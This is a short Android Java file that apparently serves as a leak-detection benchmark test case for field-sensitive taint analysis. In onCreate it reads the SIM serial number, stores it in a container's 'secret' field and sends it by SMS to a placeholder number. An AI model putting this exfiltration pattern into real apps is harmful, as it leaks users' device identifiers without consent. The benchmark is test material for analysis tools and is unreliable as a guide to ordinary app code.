package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class FieldSensitivity3 extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_field_sensitivity3);
        
        Datacontainer d1 = new Datacontainer();
		d1.setDescription("abc");
		TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		d1.setSecret(telephonyManager.getSimSerialNumber());
		
		SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49 1234", null, d1.getSecret(), null, null); 
    }    
}
